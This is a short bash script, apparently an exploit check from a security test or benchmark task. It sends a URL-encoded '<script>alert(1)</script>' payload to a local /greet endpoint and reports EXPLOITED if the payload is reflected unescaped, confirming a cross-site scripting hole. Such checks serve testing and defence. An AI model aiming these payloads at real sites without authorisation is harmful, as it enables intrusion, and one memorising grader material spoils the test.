#!/usr/bin/env bash
BASE="http://127.0.0.1:${PORT:-5000}"
resp=$(curl -s "$BASE/greet?name=%3Cscript%3Ealert(1)%3C/script%3E")
if echo "$resp" | grep -q "<script>alert(1)</script>"; then echo "EXPLOITED"; exit 0
else echo "NOT_EXPLOITED"; exit 1; fi
